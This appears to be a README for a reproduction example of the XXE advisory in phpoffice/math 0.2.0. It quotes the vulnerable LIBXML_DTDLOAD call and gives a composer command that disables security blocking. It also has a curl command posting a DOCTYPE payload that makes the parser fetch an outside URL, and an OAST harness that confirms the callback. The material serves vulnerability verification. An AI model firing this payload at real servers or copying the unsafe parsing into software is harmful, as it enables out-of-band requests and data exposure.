# GHSA-42hm-pq2f-3r7m

XML External Entity (XXE) injection in [`phpoffice/math`](https://github.com/PHPOffice/Math)
`0.2.0` (`CVE-2025-48882`). The MathML reader parses untrusted input with the
external DTD subset enabled:

```php
// vendor/phpoffice/math/src/Math/Reader/MathML.php:38
$this->dom->loadXML($content, LIBXML_DTDLOAD);
```

`LIBXML_DTDLOAD` makes libxml load the external DTD, so a `<!DOCTYPE math SYSTEM
"http://attacker/...">` is fetched out-of-band when any caller hands user-supplied
MathML to `MathML::read()`. Fixed in `0.2.1` by removing the DTD-load flag.

The app in `app/` is a thin HTTP harness that installs the **real pinned vulnerable
`phpoffice/math@0.2.0`** via Composer and calls `MathML::read()` on the raw request
body at `POST /import/mathml` — exactly the code path the advisory describes.

Sources:

- https://github.com/PHPOffice/Math/security/advisories/GHSA-42hm-pq2f-3r7m
- https://github.com/advisories/GHSA-42hm-pq2f-3r7m
- https://osv.dev/vulnerability/CVE-2025-48882

## Reproduce

```bash
cd examples/xxe-oast-phpoffice-math/app
# vendored vulnerable phpoffice/math@0.2.0 (advisory blocking is disabled so the
# known-vulnerable version installs):
composer install --no-security-blocking
php -S 127.0.0.1:8087 server.php
```

Quick manual check (start any listener on :7799 first):

```bash
curl -s -X POST -H 'content-type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE math SYSTEM "http://127.0.0.1:7799/x"><math><mi>1</mi></math>' \
  http://127.0.0.1:8087/import/mathml
# -> the parser issues an outbound GET http://127.0.0.1:7799/x
```

In another terminal from the `nocapsec` repo:

```bash
go run ./examples/xxe-oast-phpoffice-math
```

The example starts an embedded OAST receiver, rewrites the placeholder `SYSTEM` URL
in the MathML DOCTYPE to its callback, posts it to `/import/mathml`, and polls for the
out-of-band hit. A verified report (`protocol: http`, `attributed_to: target_infra`)
proves the parser fetched the external entity. (The general-entity form `&xxe;`
does **not** fire here — it needs `LIBXML_NOENT`; the external-DTD form fires on
`LIBXML_DTDLOAD` alone.)
